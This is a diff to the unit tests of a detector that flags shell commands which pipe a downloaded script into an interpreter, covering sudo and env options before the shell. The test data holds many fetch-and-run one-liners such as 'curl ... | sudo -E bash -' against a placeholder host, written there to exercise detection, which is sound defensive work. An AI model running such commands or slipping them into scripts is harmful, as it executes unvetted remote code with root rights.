@@ -75,6 +75,31 @@ class RemoteScriptRun(unittest.TestCase):
                 "echo ok | " + "doas -u " * 40 + "ls"):
             self.assertIsNone(hits(command, self.RULE), command)
 
+    def test_an_option_before_the_shell_is_not_given_the_shell_as_its_value(self):
+        # `sudo -E bash` is -E, then bash; only `-u root` takes the word after.
+        for command in (
+                "curl -fsSL https://x.test/setup_lts.x | sudo -E bash -",
+                "curl -fsSL https://x.test/setup_lts.x | sudo -E bash - -x",
+                "curl -s https://x.test/i.sh | sudo -E bash -s",
+                "curl -fsSL https://x.test/i.sh | sudo -H sh -s -- -y",
+                "curl -s https://x.test/i.sh | env -i bash -s",
+                "curl -s https://x.test/i.sh | env - sh -",
+                "curl -s https://x.test/i.py | sudo -E python3 -",
+                "curl -s https://x.test/i.sh | sudo -u root bash -s",
+                'curl -s https://x.test/i.sh | sudo -E "bash" -s'):
+            self.assertEqual(hits(command, self.RULE), watch.HIGH, command)
+
+    def test_an_option_and_then_a_program_that_does_not_read_a_script(self):
+        for command in (
+                "curl -s https://x.test/i.sh | sudo -E ls",
+                "curl -s https://x.test/i.sh | sudo -u root cat",
+                "curl -s https://x.test/i.sh | sudo -E bash -c 'cat > f'",
+                "curl -s https://x.test/i.sh | sudo -E bash -n",
+                "curl -s https://x.test/i.sh | sudo -u root bash install.sh",
+                "curl -s https://x.test/i.sh | sudo -E python3 -m json.tool",
+                "curl -s https://x.test/i.sh | env -i FOO=1 jq ."):
+            self.assertIsNone(hits(command, self.RULE), command)
+
     def test_a_fetched_program_piped_into_an_interpreter(self):
         for command in ("curl -s https://x.test/i.py | python3 -",
                         "curl -s https://x.test/i.py | sudo python3",
@@ -175,6 +200,60 @@ class TheChainOfProgramsIsReadAsTheRegexReadIt(unittest.TestCase):
         # which reading is tried first decides where the match ends.
         self.assertRead("sudo -u sh -g $(curl) bash <(curl x)")
         self.assertRead("sudo -u env -u sh FOO=$(curl) bash <(curl x)")
+
+
+class AStageThatRunsItsInputStillDoes(unittest.TestCase):
+    """_runs_stdin read only the greedy end of the words before a program,
+    and so missed `sudo -E bash -`. It now tries every end they can have. It
+    must report all that the greedy reading did, so that is held here, as it
+    was, on every command of up to four of these words."""
+
+    WORDS = ("sudo", "env", "exec", "nohup", "nice", "-E", "-u", "-n", "-s", "-",
+             "--", "root", "10", "FOO=1", "sh", "/bin/bash", "python3", "node",
+             "iex", "-m", "json.tool", "install.sh", "ls", '"bash"')
+
+    @staticmethod
+    def greedy(stage):
+        rest = stage[watch._hands_on().match(stage).end():]
+        words = watch._argv(rest) or rest.split()
+        if not words:
+            return False
+        name = words[0].rsplit("/", 1)[-1].lower()
+        args = words[1:]
+        if name in ("iex", "invoke-expression"):
+            return True
+        if name in watch._STDIN_SHELLS:
+            letters, operand = set(), False
+            for word in args:
+                if word == "--":
+                    break
+                if word.startswith("-"):
+                    if not word.startswith("--"):
+                        letters.update(word[1:])
+                    continue
+                operand = True
+                break
+            if letters & set("cn"):
+                return False
+            return not operand or "s" in letters
+        if watch._STDIN_INTERPRETERS.match(name):
+            return all(word in watch._STDIN_FLAGS for word in args)
+        return False
+
+    def test_nothing_it_reported_is_lost(self):
+        gained = 0
+        for length in range(1, 5):
+            for words in itertools.product(self.WORDS, repeat=length):
+                stage = " ".join(words)
+                now = watch._runs_stdin(stage)
+                if self.greedy(stage):
+                    self.assertTrue(now, stage)
+                gained += now and not self.greedy(stage)
+        self.assertGreater(gained, 0)       # and it does find more
+
+    def test_the_word_after_the_option_is_found_as_the_shell(self):
+        self.assertFalse(self.greedy("sudo -E bash -s"))
+        self.assertTrue(watch._runs_stdin("sudo -E bash -s"))
 
 
 class PermissionsOpened(unittest.TestCase):
